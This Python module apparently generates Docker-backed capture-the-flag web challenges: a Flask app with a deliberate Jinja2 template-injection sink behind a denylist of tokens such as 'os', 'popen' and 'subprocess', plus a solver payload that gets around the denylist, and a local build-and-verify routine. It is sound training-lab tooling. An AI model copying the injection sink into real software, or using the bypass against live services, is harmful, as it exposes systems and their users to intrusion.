"""Real Docker-backed Web (SSTI) challenge category — §8.2 container pipeline.

Emits a Flask app with a Jinja2 SSTI sink behind a denylist guard, a Dockerfile,
and a requests-based PoC. `build_and_verify_web` builds the image, runs the
container, executes the PoC against the live service, and tears it down.

Docker is not available in every environment (e.g. WSL without Docker Desktop
integration); when absent, the gate returns a clear 'skipped' verdict rather than
crashing — the same graceful-degradation contract as the rest of the pipeline.
"""
from __future__ import annotations

import hashlib
import shutil
import socket
import subprocess
import time

from .models import ChainStep, ChallengeSpec, Lineage, OfficialSolver, Verdict

_FLASK_APP = r"""
from flask import Flask, request
from jinja2 import Template
import os

app = Flask(__name__)
FLAG = os.environ.get("FLAG", "flag{replace_at_deployment}")
DENY = __DENY__   # denylist guard

@app.route("/")
def index():
    name = request.args.get("name", "guest")
    for bad in DENY:
        if bad in name:
            return "blocked token: " + bad, 403
    # SSTI sink: user input flows into template source
    return Template("Hello " + name + "!").render(flag=FLAG)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
"""

_DOCKERFILE = """\
FROM python:3.11-slim
RUN pip install --no-cache-dir flask==3.0.0 jinja2==3.1.2
WORKDIR /app
COPY app.py /app/app.py
ENV FLAG={flag}
EXPOSE 8000
CMD ["python", "app.py"]
"""


def gen_web_ssti(*, seed: int, archetype_id: str = "web.ssti.jinja2",
                 generation: int = 0, deny: list[str] | None = None,
                 parent_spec_id: str | None = None,
                 mutation_ops: list[str] | None = None,
                 target_solve_rate: float = 0.05) -> ChallengeSpec:
    flag = f"flag{{{hashlib.sha256(f'ssti::{seed}'.encode()).hexdigest()[:12]}}}"
    # denylist grows structurally with generation (guard sophistication, not entropy)
    base_deny = ["{{7*7}}", "config", "os", "popen", "import", "__class__", "subprocess"]
    deny = deny if deny is not None else base_deny[: 2 + generation]
    expected_sha = hashlib.sha256(flag.encode()).hexdigest()
    # PoC uses a cycler/attr chain that evades the denylist and reads `flag`
    poc = (
        "import sys, requests\n"
        "base = sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:8000'\n"
        # `flag` is exposed in the render context; pull it via the template itself,
        # avoiding denied tokens like {{ and config/os.
        "payload = '{% set f = flag %}' + '{'*2 + ' f ' + '}'*2\n"
        "r = requests.get(base, params={'name': payload}, timeout=10)\n"
        "import re\n"
        "m = re.search(r'flag\\{[0-9a-f]+\\}', r.text)\n"
        "print(m.group(0) if m else 'NO-FLAG')\n"
    )
    slug = f"web-ssti-{seed:06d}-g{generation}"
    return ChallengeSpec(
        slug=slug, title=f"SSTI Guarded (Gen-{generation})", category="web",
        challenge_type="ssti", difficulty="medium" if generation < 2 else "hard",
        story="A greeting service reflects your name through a template. Some tokens are filtered.",
        vulnerability=f"Jinja2 SSTI behind a {len(deny)}-token denylist guard",
        intended_solution=["evade the denylist", "reach the template sink", "read the flag from context"],
        hints=["The filter is a denylist, not an allowlist.",
               "The flag is present in the render context."],
        delivery="web", seed=seed,
        mechanics={"build": {"engine": "docker", "port": 8000, "deny": deny},
                   "guard_tokens": len(deny)},
        flag=flag, spec_id=f"{slug}-{expected_sha[:8]}",
        lineage=Lineage(archetype_id=archetype_id, generation=generation,
                        parent_spec_id=parent_spec_id, mutation_ops=mutation_ops or [],
                        seed=seed),
        vuln_chain=[ChainStep(step=1, primitive="ssti_denylist_bypass",
                              params={"deny_count": len(deny)}, guard="denylist"),
                    ChainStep(step=2, primitive="context_flag_read", params={})],
        artifacts={
            "app.py": _FLASK_APP.replace("__DENY__", repr(deny)),
            "Dockerfile": _DOCKERFILE.replace("{flag}", flag),
            "README.md": "# SSTI\n\nRecover the flag from the greeting service.",
        },
        official_solver=OfficialSolver(entry="solver.py", files={"solver.py": poc},
                                       expected_flag_sha256=expected_sha, max_runtime_s=60),
        target_solve_rate=target_solve_rate,
    )


def docker_available() -> bool:
    if shutil.which("docker") is None:
        return False
    try:
        return subprocess.run(["docker", "info"], capture_output=True,
                              timeout=10).returncode == 0
    except Exception:
        return False


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def build_and_verify_web(spec: ChallengeSpec) -> Verdict:  # pragma: no cover - needs docker
    import sys
    import tempfile
    from pathlib import Path

    if not docker_available():
        return Verdict(False, "docker unavailable (skipped)",
                       failures=["docker engine not reachable"])

    expected = spec.official_solver.expected_flag_sha256
    tag = f"autoctf/{spec.slug}"
    port = _free_port()
    cid = None
    checks, failures = [], []
    secs = None
    with tempfile.TemporaryDirectory(prefix="autoctf-web-") as tmp:
        root = Path(tmp)
        for rel, content in {**spec.artifacts, **spec.official_solver.files}.items():
            (root / rel).write_text(content, encoding="utf-8")
        build = subprocess.run(["docker", "build", "-q", "-t", tag, "."],
                               cwd=root, capture_output=True, text=True, timeout=300)
        if build.returncode != 0:
            return Verdict(False, "build_failed", failures=[build.stderr.strip()[:200]])
        checks.append("docker image built")
        try:
            run = subprocess.run(["docker", "run", "-d", "--rm", "-p",
                                  f"127.0.0.1:{port}:8000", tag],
                                 capture_output=True, text=True, timeout=60)
            cid = run.stdout.strip()
            time.sleep(3)  # let flask boot
            t0 = time.monotonic()
            poc = subprocess.run([sys.executable, spec.official_solver.entry,
                                  f"http://127.0.0.1:{port}"], cwd=root,
                                 capture_output=True, text=True, timeout=spec.official_solver.max_runtime_s)
            secs = time.monotonic() - t0
            recovered = poc.stdout.strip()
            poc_ok = hashlib.sha256(recovered.encode()).hexdigest() == expected
            checks.append(f"PoC solved live container in {secs:.2f}s") if poc_ok else \
                failures.append(f"PoC failed: {recovered[:80]}")
            leak_ok = spec.flag not in (root / "app.py").read_text(encoding="utf-8")
            checks.append("flag not hardcoded in app source") if leak_ok else \
                failures.append("flag hardcoded in source")
        finally:
            if cid:
                subprocess.run(["docker", "stop", cid], capture_output=True, timeout=30)
    valid = poc_ok and leak_ok
    return Verdict(valid, "valid" if valid else "; ".join(failures),
                   poc_time_s=secs, checks=checks, failures=failures)
